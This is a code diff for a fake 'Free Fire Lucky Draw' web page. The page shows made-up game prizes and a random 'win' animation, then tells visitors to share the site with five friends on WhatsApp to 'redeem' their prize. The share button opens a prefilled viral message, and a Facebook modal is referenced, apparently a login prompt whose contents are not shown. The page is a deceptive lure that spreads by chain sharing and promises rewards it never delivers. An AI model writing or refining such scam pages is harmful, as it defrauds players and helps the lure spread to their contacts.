@@ -32,6 +32,8 @@ h1 {
   align-items: center;
   justify-content: center;
   overflow: hidden;
+  flex-direction: column;
+  color: white;
 }
 #prizeBox img {
   max-width: 120px;
@@ -49,6 +51,7 @@ h1 {
   pointer-events: none;
   color: white;
   letter-spacing: 1.2px;
+  margin-top: 10px;
 }
 .prize-pool {
   margin-top: 24px;
@@ -62,20 +65,28 @@ h1 {
 }
 .prize-pool .prize {
   width: 75px;
-  height: 75px;
+  height: 100px;
   border-radius: 12px;
   background: #202a48;
   border: 2px solid #444;
   display: flex;
+  flex-direction: column;
   justify-content: center;
   align-items: center;
   transition: border-color 0.4s, box-shadow 0.4s;
+  user-select: none;
 }
 .prize-pool .prize img {
   max-width: 60px;
   max-height: 60px;
   border-radius: 10px;
-  user-select: none;
+}
+.prize-pool .prize .label {
+  margin-top: 6px;
+  font-size: 0.9em;
+  color: #ffd97d;
+  font-weight: bold;
+  text-align: center;
 }
 .prize-pool .prize.highlight {
   border-color: #ffad07;
@@ -188,7 +199,7 @@ h1 {
 @media screen and (max-width: 600px) {
   .prize-pool .prize {
     width: 50px;
-    height: 50px;
+    height: 70px;
   }
   .prize-pool .prize img {
     max-width: 40px;
@@ -207,20 +218,40 @@ h1 {
 </head>
 <body>
   <h1>Free Fire Lucky Draw</h1>
+
   <div id="prizeBox">
     <div class="text">Click to Open</div>
     <img alt="Winning Prize" />
+    <div id="prizeName" class="text"></div>
   </div>
 
   <div class="prize-pool" id="prizePool">
-    <div class="prize" data-idx="0"><img src="diamond-500.png" alt="500 Diamonds" title="500 Diamonds" /></div>
-    <div class="prize" data-idx="1"><img src="diamond-300.png" alt="300 Diamonds" title="300 Diamonds" /></div>
-    <div class="prize" data-idx="2"><img src="rare-gun-skin.png" alt="Rare Gun Skin Box" title="Rare Gun Skin Box" /></div>
-    <div class="prize" data-idx="3"><img src="rare-dress.jpg" alt="Rare Dress" title="Rare Dress" /></div>
-    <div class="prize" data-idx="4"><img src="pet-box.png" alt="Pet Box" title="Pet Box" /></div>
+    <div class="prize" data-idx="0">
+      <img src="diamond-500.png" alt="500 Diamonds" title="500 Diamonds" />
+      <div class="label">500 Diamonds</div>
+    </div>
+    <div class="prize" data-idx="1">
+      <img src="diamond-300.png" alt="300 Diamonds" title="300 Diamonds" />
+      <div class="label">300 Diamonds</div>
+    </div>
+    <div class="prize" data-idx="2">
+      <img src="rare-gun-skin.png" alt="Rare Gun Skin Box" title="Rare Gun Skin Box" />
+      <div class="label">Rare Gun Skin Box</div>
+    </div>
+    <div class="prize" data-idx="3">
+      <img src="rare-dress.jpg" alt="Rare Dress" title="Rare Dress" />
+      <div class="label">Rare Dress</div>
+    </div>
+    <div class="prize" data-idx="4">
+      <img src="pet-box.png" alt="Pet Box" title="Pet Box" />
+      <div class="label">Pet Box</div>
+    </div>
   </div>
 
-  <button id="share-btn" class="spin-btn" style="margin-top: 20px;">Share this site with 5 friends on WhatsApp to redeem your prize</button>
+  <button id="share-btn" class="spin-btn" style="margin-top: 20px;">
+    Please share this site once to 5 different friends on WhatsApp to redeem your prize
+  </button>
+
   <div id="redeem-area" style="margin-top:15px; display:none;">
     <button class="redeem-btn" id="redeemBtn" disabled>Redeem</button>
   </div>
@@ -259,6 +290,7 @@ h1 {
   const redeemBtn = document.getElementById('redeemBtn');
   const redeemArea = document.getElementById('redeem-area');
   const resultImg = prizeBox.querySelector('img');
+  const resultName = document.getElementById('prizeName');
   const resultText = prizeBox.querySelector('.text');
 
   let opened = false;
@@ -266,11 +298,13 @@ h1 {
 
   function resetPrizeBox() {
     resultImg.style.display = 'none';
+    resultName.textContent = '';
     resultText.style.display = 'block';
     resultText.textContent = 'Click to Open';
     redeemBtn.disabled = true;
     redeemArea.style.display = 'none';
     prizePoolDivs.forEach(div => div.classList.remove('highlight'));
+    shareBtn.style.display = 'block';
     opened = false;
   }
 
@@ -287,7 +321,6 @@ h1 {
       if (currentStep < steps) {
         setTimeout(step, 80 + currentStep * 10);
       } else {
-        // end animation highlighting winning prize
         prizePoolDivs.forEach(div => div.classList.remove('highlight'));
         prizePoolDivs[idx].classList.add('highlight');
         showWinningPrize(idx);
@@ -302,9 +335,9 @@ h1 {
     resultImg.src = prizes[idx].img;
     resultImg.alt = prizes[idx].name;
     resultImg.style.display = 'block';
+    resultName.textContent = prizes[idx].name;
     redeemBtn.disabled = true;
     redeemArea.style.display = 'block';
-    shareBtn.style.display = 'block';
   }
 
   prizeBox.addEventListener('click', () => {
@@ -314,12 +347,10 @@ h1 {
     animatePrizeSelection(randomIndex);
   });
 
-  // Share button logic
   shareBtn.addEventListener('click', () => {
     const siteURL = encodeURIComponent(window.location.href);
     const whatsappLink = `https://wa.me/?text=Check out this awesome Free Fire Lucky Draw! Share it with 5 friends and claim your prize: ${siteURL}`;
     window.open(whatsappLink, '_blank');
-    // Unlock redeem immediately after one share click
     redeemBtn.disabled = false;
     shareBtn.style.display = 'none';
   });
@@ -359,17 +390,12 @@ h1 {
       });
   });
 
-  // Close Facebook modal button
   document.querySelector('.close-fb').addEventListener('click', () => {
     document.getElementById('fb-modal').style.display = 'none';
   });
 
-  // Hide modals initially
-  document.getElementById('fb-modal').style.display = 'none';
-  document.getElementById('confirmation-page').style.display = 'none';
-  shareBtn.style.display = 'none';
+  // Initialize UI
   resetPrizeBox();
 </script>
 </body>
 </html>
-
